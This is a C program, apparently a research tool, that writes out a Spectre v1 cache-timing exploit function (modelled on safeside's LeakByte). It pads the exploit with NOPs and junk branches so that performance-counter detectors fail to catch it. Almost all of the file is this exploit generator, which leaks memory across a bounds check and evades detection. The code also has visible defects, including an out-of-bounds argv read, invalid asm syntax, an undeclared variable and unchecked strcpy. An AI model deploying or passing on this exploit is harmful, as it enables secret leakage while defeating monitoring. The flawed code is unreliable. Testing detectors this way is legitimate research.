#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>


void print_spaces(FILE *fout, int num_spaces)
{
    for (size_t i = 0; i < num_spaces; i++) {
        fprintf(fout, " ");
    }
}
/**
 * pollute branches - this introduces a lot of well-behaved branches into
 * the mix, thereby ensuring that the branch pattern counts
 * are polluted.
 */
void gen_spectre_v1_pollute_branches(FILE *fout, int num_spaces, int num_iterations) {
    print_spaces(fout, num_spaces);
    fprintf(fout, "for (size_t i = 0; i < %d; i++) {\n", num_iterations);
    print_spaces(fout, num_spaces);
    fprintf(fout, "    if ( i %% 2 == 0 ) {\n");
    print_spaces(fout, num_spaces);
    fprintf(fout, "        temp &= i;\n");
    print_spaces(fout, num_spaces);
    fprintf(fout, "    }\n");
    print_spaces(fout, num_spaces);
    fprintf(fout, "}\n");
}

/**
 * pollute the total number of instruction counts by adding random number 
 * of NOP instructions, this is done to pollute the number of instruction
 * counts and see how it affects detection.
 */
void gen_spectre_v1_pollute_instructions(FILE *fout, int num_spaces, int num_nop_statements) {
    for (size_t i = 0; i < num_nop_statements; i++) {
        print_spaces(fout, num_spaces);
        fprintf(fout, "asm(nop);\n");
    }
}

/**
 * we plan to artificially increase the number of cycles by increasing the
 * number of branch mispredictions, this will pollute the number of cycles
 * and may end up evading detectors that are trained to read cycle events in
 * hardware
 */
void gen_spectre_v1_pollute_cycles(FILE *fout, int num_spaces, int num_iterations) {
    print_spaces(fout, num_spaces);
    fprintf(fout, "for (size_t i = 1; i < %d; i++) {\n", num_iterations);
    print_spaces(fout, num_spaces);
    fprintf(fout, "    if ((rand() %% i) == 0) {\n");
    print_spaces(fout, num_spaces);
    fprintf(fout, "        temp &= i;\n");
    print_spaces(fout, num_spaces);
    fprintf(fout, "    }\n");
    print_spaces(fout, num_spaces);
    fprintf(fout, "}\n");
}

/* 
 * this function generates the LeakByte function in safeside
 * but this will have some evasive code added into it-
 * depending on the performance counter we would like to
 * pollute.
 */
void gen_spectre_v1_evasive_exploit(FILE *fout, char *event_type, int variability) {

    fprintf(fout, "#include \"utils.h\"\n");
    fprintf(fout, "#include \"instr.h\"\n");
    fprintf(fout, "#include \"timing_array.h\"\n\n\n");

    fprintf(fout, "static char LeakByte(const char *data, size_t offset) {\n");    

    fprintf(fout, "    TimingArray timing_array;\n");

    fprintf(fout, "    std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(\n");
    fprintf(fout, "        new size_t(strlen(data)));\n\n");

    // call evasive code here - that pollute performance counter values
    if (strcmp(event_type, "instructions") == 0) {
        gen_spectre_v1_pollute_instructions(fout, 4, variability);
    }
    else if (strcmp(event_type, "cycles") == 0) {
        gen_spectre_v1_pollute_cycles(fout, 4, variability);
    }
    else if (strcmp(event_type, "branches") == 0) {
        gen_spectre_v1_pollute_branches(fout, 4, variability);
    }
    fprintf(fout, "    for (int run = 0;; ++run)  {\n");
    fprintf(fout, "        timing_array.FlushFromCache();\n");
    fprintf(fout, "        int safe_offset = run %% strlen(data);\n\n");
    fprintf(fout, "        for (size_t i = 0; i < 2048; ++i) {\n");
    fprintf(fout, "            FlushDataCacheLine(size_in_heap.get());\n\n");
    fprintf(fout, "            // training branch predictor: \n");
    fprintf(fout, "            size_t local_offset = \n");
    fprintf(fout, "                offset + (safe_offset - offset) * static_cast<bool>((i + 1) %% 2048);\n");

    fprintf(fout, "            if (local_offset < *size_in_heap) {\n");
    fprintf(fout, "                ForceRead(&timing_array[data[local_offset]]);\n");
    fprintf(fout, "            }\n");
    fprintf(fout, "        }\n\n");
    fprintf(fout, "        int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);\n");
    fprintf(fout, "        if (ret >= 0 && ret != data[safe_offset]) {\n");
    fprintf(fout, "            return ret;\n");
    fprintf(fout, "        }\n\n");
    fprintf(fout, "        if (run > 100000) {\n");
    fprintf(fout, "            std::cerr << \"Does not converge\" << std::endl;\n");
    fprintf(fout, "            exit(EXIT_FAILURE);\n");
    fprintf(fout, "        }\n");
    fprintf(fout, "    }\n");
    fprintf(fout, "}\n");
}

int main(int argc, char *argv[])
{
    if (argc != 2 && argc != 3) {
        printf("Usage: <name of this binary> <attack type: one of spectrev1, spectrev2, meltdown or a disclosure primitive> <hardware event (optional)>\n");
	printf("for spectre v1: hardware events may be - \"branches\", \"instructions\", \"cycles\"\n");
	printf("hardware event parameter is needed when there are multiple hardware PMCs that can be polluted for an attack\n");
        return 1;
    }

    srand(time(NULL));

    char event_type[80] = {'\0'};
    char attack_type[80] = {'\0'};
    if (argv[2][0] != '\0') {
        strcpy(event_type, argv[2]);
    }
    if (argv[1][0] != '\0') {
        strcpy(attack_type, argv[1]);
    }

    char gen_code_filename[256];

    strcpy(gen_code_filename, "gen_leakage_function_");

    if (attack_type[0] != '\0') {
        strcat(gen_code_filename, attack_type);
        strcat(gen_code_filename, "_");
    }

    if (event_type[0] != '\0') {
        strcat(gen_code_filename, event_type);
    }

    strcat(gen_code_filename, ".cc");
    printf("%s\n", gen_code_filename);

    FILE *exploit_code_file = fopen(gen_code_filename, "w");

    if (exploit_code_file == NULL) {
        printf("Could not open file...exiting...\n");
        return 1;
    }

    if (strcmp(attack_type, "spectrev1") == 0) {
        /* generate randomness - we limit random numbers from 1-100 */
        int variable = (rand() % 100) + 1;
        gen_spectre_v1_evasive_exploit(exploit_code_file, event_type, variable);
    }
}
